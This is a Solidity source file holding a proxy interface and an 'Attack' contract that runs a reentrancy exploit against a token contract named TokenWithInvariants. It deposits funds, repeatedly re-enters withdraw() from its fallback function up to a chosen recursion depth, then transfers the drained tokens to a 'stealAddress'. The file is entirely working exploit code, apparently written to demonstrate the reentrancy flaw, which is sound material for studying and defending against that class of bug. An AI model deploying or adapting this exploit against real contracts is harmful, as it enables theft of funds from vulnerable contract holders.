/* The proxy contract is required to declare an interface
   that Attack understands */
contract TWIProxy {
  event Log(string msg ,address from, address to, uint value);
  mapping(address => uint) public balanceOf;
  uint public totalSupply;

  function transfer(address to, uint value) {
  }

  function deposit(uint amount) {
  }

  function withdraw() {
  }

}


contract Attack {
  event AttackLog(string msg, uint value);
  bool performAttack = false;
  uint8 depth = 0;
  uint constant conversion = 1 szabo;
  uint recursions = 1;
  /* fill in with address of TokenWithInvariants contract */
  TWIProxy twi;
  address stealAddress;
  uint8 numTokens;
  uint tokensInWei;

  /* Constructor */
  function Attack(address _contractAddress, address _stealAddress, uint8 _numTokens, uint _recursions) {
    twi = TWIProxy(_contractAddress);
    stealAddress = _stealAddress;
    numTokens    = _numTokens;
    recursions   = _recursions;
    tokensInWei  = numTokens * conversion;
  }

  /* Default function. Always run */
  function() {
    if (performAttack) {
      depth = depth + 1;
      AttackLog("value", (uint)(this.balance/conversion));
      if (depth < recursions) {  /* attack again */
        twi.withdraw();
      } else {
        AttackLog("Transferring tokens", 99);
        twi.transfer.value(recursions*tokensInWei)(stealAddress,numTokens);
        performAttack = false; /* turn off attack again*/
      }
    }
  }

  function reset() {
    performAttack = false;
  }

  function attack() {
    depth = 0;
    performAttack = true;
    /* Contract itself must have some funds to make deposit*/
    twi.deposit.value(tokensInWei)(numTokens);
    twi.withdraw();
  }

}